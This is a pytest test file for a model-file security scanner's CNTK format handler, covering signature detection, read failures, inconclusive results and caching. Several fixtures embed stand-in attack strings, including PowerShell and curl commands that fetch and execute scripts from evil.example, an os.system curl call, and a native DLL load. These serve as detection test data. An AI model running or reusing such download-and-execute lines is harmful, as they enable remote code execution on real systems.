from pathlib import Path

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.models import ModelAuditResultModel
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.cntk_scanner import DISCOVERY_ASSUMPTIONS, CntkScanner


def _write_legacy_cntk(path: Path, payload: bytes = b"") -> None:
    header = b"B\x00C\x00N\x00\x00\x00B\x00V\x00e\x00r\x00s\x00i\x00o\x00n\x00\x00\x00"
    path.write_bytes(header + payload)


def _write_cntkv2(path: Path, payload: bytes = b"", include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    path.write_bytes(prefix + structure + payload)


def _scan_without_cache(path: Path) -> ModelAuditResultModel:
    return scan_model_directory_or_file(str(path), cache_scan_results=False)


def _assert_cntk_read_failure(
    direct: ScanResult,
    aggregate: ModelAuditResultModel,
    path: Path,
) -> None:
    read_checks = [check for check in direct.checks if check.name == "CNTK File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "cntk_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "cntk_read_failed" in direct.metadata["scan_outcome_reasons"]
    assert direct.metadata["operational_error"] is True
    assert direct.metadata["operational_error_reason"] == "cntk_read_failed"

    metadata = aggregate.file_metadata[str(path)]
    assert "cntk_read_failed" in metadata["scan_outcome_reasons"]
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_cntk_scanner_can_handle_legacy_signature(tmp_path: Path) -> None:
    path = tmp_path / "legacy.dnn"
    _write_legacy_cntk(path, payload=b" inputs outputs ")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_can_handle_cntkv2_signature(tmp_path: Path) -> None:
    path = tmp_path / "graph.cmf"
    _write_cntkv2(path, payload=b" inputs outputs ")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_can_handle_signature_with_misleading_suffix(tmp_path: Path) -> None:
    path = tmp_path / "renamed.jpg"
    _write_cntkv2(path, payload=b" inputs outputs ")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_rejects_renamed_structure_near_match(tmp_path: Path) -> None:
    path = tmp_path / "near_match.jpg"
    _write_cntkv2(path, payload=b" inputs outputs ", include_structure=False)
    assert not CntkScanner.can_handle(str(path))


def test_cntk_scanner_rejects_misnamed_non_cntk_file(tmp_path: Path) -> None:
    path = tmp_path / "not_cntk.dnn"
    path.write_text("plain text that should not match CNTK signatures")
    assert not CntkScanner.can_handle(str(path))


@pytest.mark.parametrize("filename", ["graph.model", "renamed.jpg"])
def test_cntk_scanner_handles_strict_signature_independently_of_suffix(tmp_path: Path, filename: str) -> None:
    path = tmp_path / filename
    _write_cntkv2(path, payload=b"inputs outputs")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_rejects_renamed_structure_near_match(tmp_path: Path) -> None:
    path = tmp_path / "near-match.jpg"
    _write_cntkv2(path, payload=b"inputs outputs", include_structure=False)

    assert not CntkScanner.can_handle(str(path))


@pytest.mark.parametrize(
    ("suffix", "expected"),
    [
        (".dnn", True),
        (".cmf", True),
        (".jpg", False),
        (".txt", False),
        (".lgb", False),
        (".model", False),
    ],
)
def test_cntk_scanner_only_claims_unreadable_dedicated_extensions(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    suffix: str,
    expected: bool,
) -> None:
    path = tmp_path / f"unreadable{suffix}"
    _write_cntkv2(path, payload=b" inputs outputs ")

    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
        raise OSError("simulated CNTK signature read failure")

    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)

    assert CntkScanner.can_handle(str(path)) is expected


def test_cntk_scanner_reports_unsupported_variant_info(tmp_path: Path) -> None:
    path = tmp_path / "unsupported.dnn"
    _write_cntkv2(path, payload=b"inputs outputs", include_structure=False)

    result = CntkScanner().scan(str(path))

    assert not result.success
    assert any("unsupported or out-of-scope cntk variant" in issue.message.lower() for issue in result.issues)
    assert any(issue.severity == IssueSeverity.INFO for issue in result.issues)


def test_cntk_scanner_detects_multi_signal_payload_as_critical(tmp_path: Path) -> None:
    path = tmp_path / "malicious.dnn"
    payload = (
        b" native_user_function loadlibrary C:\\temp\\evil.dll "
        b" powershell -c iwr http://evil.example/p.ps1 | iex "
        b" base64.b64decode(" + (b"A" * 96) + b") exec(payload) "
    )
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("multiple independent suspicious signals" in issue.message.lower() for issue in result.issues)


def test_cntk_scanner_detects_split_native_library_load_reference(tmp_path: Path) -> None:
    path = tmp_path / "split_native_load.dnn"
    payload = b" native_user_function\x00C:\\temp\\evil.dll "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    matching_issues = [
        issue
        for issue in result.issues
        if issue.details.get("category") == "external_load_reference"
        and "library_reference=C:\\temp\\evil.dll" in " ".join(issue.details.get("examples", []))
    ]
    assert matching_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in matching_issues)


def test_cntk_scanner_split_load_correlation_ignores_generic_metadata(tmp_path: Path) -> None:
    path = tmp_path / "benign_split_words.cmf"
    payload = b" module\x00/model/base\x00library_version\x00native_user_functional_features\x00evil.dllcache "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert result.success is True
    assert result.issues == []


def test_cntk_scanner_false_positive_control_no_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign_risky_words.cmf"
    payload = b" exec_summary network_score library_version model_path=/models/base "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_cntk_scanner_known_safe_defaults_no_findings(tmp_path: Path) -> None:
    path = tmp_path / "safe_defaults.dnn"
    payload = b" version uid inputs outputs attributes parameter1 placeholder1 "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert result.success
    assert result.issues == []


def test_cntk_scanner_reports_truncated_supported_variant(tmp_path: Path) -> None:
    path = tmp_path / "truncated.dnn"
    _write_legacy_cntk(path, payload=b"tiny")

    result = CntkScanner().scan(str(path))

    assert not result.success
    assert any("truncated or structurally incomplete" in issue.message.lower() for issue in result.issues)


def test_cntk_scanner_marks_bounded_prefix_analysis_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "bounded.cmf"
    _write_cntkv2(path, payload=b" " + (b"safe " * 64))
    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_SCAN_BYTES", 64)

    result = CntkScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "cntk_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            assert "cntk_bounded_read_incomplete" in aggregate.file_metadata[str(path)]["scan_outcome_reasons"]
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_cntk_scanner_file_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.jpg"
    _write_cntkv2(path)

    def raise_os_error(*_args: object, **_kwargs: object) -> tuple[bytes, bool]:
        raise OSError("simulated CNTK read failure")

    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_bounded", raise_os_error)

    direct = CntkScanner().scan(str(path))

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            _assert_cntk_read_failure(direct, aggregate, path)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_cntk_scanner_signature_read_failure_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "signature-unreadable.jpg"
    _write_cntkv2(path)

    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
        raise OSError("simulated CNTK signature read failure")

    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)

    result = CntkScanner().scan(str(path))

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            _assert_cntk_read_failure(result, aggregate, path)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_cntk_scanner_marks_late_string_payload_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "late-payload.jpg"
    _write_cntkv2(
        path,
        payload=b"\x00safe_fragment_two\x00powershell -c curl http://evil.example/p.ps1\x00",
    )
    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)

    result = CntkScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "cntk_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert "stopped at the configured extraction limit" in budget_checks[0].message
    assert budget_checks[0].details["analysis_incomplete"] is True

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_cntk_scanner_inconclusive_warning_signal_is_not_successful(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "warning-before-limit.cmf"
    _write_cntkv2(path)
    monkeypatch.setattr(
        "modelaudit.scanners.cntk_scanner._extract_candidate_strings",
        lambda _data: (["os.system('curl http://evil.example/payload')"], True),
    )

    result = CntkScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(check.severity == IssueSeverity.WARNING for check in result.checks)


def test_cntk_scanner_exact_string_limit_preserves_clean_result(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "exact-limit.jpg"
    _write_cntkv2(path)
    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)

    result = CntkScanner().scan(str(path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_cntk_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.cmf"
    _write_cntkv2(path, payload=b" safe metadata ")

    def raise_os_error(_path: str, _max_bytes: int) -> tuple[bytes, bool]:
        raise OSError("simulated CNTK read failure")

    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_bounded", raise_os_error)

    direct = CntkScanner().scan(str(path))
    aggregate = _scan_without_cache(path)

    _assert_cntk_read_failure(direct, aggregate, path)


def test_cntk_signature_read_failure_still_routes_to_inconclusive_scan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "signature-unreadable.cmf"
    _write_cntkv2(path, payload=b" safe metadata ")

    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
        raise OSError("simulated CNTK signature read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)

    aggregate = _scan_without_cache(path)

    metadata = aggregate.file_metadata[str(path)]
    assert "cntk_read_failed" in metadata["scan_outcome_reasons"]
    assert determine_exit_code(aggregate) == 2


def test_cntk_unreadable_path_preflight_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "permission-denied.cmf"
    _write_cntkv2(path, payload=b" safe metadata ")

    def deny_access(_path: str, _mode: int) -> bool:
        return False

    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
        raise OSError("simulated permission-denied read failure")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)
    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)

    direct = CntkScanner().scan(str(path))
    aggregate = _scan_without_cache(path)

    _assert_cntk_read_failure(direct, aggregate, path)


def test_cntk_scanner_records_scope_assumptions(tmp_path: Path) -> None:
    path = tmp_path / "safe.cmf"
    _write_cntkv2(path, payload=b" version uid inputs outputs ")

    result = CntkScanner().scan(str(path))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
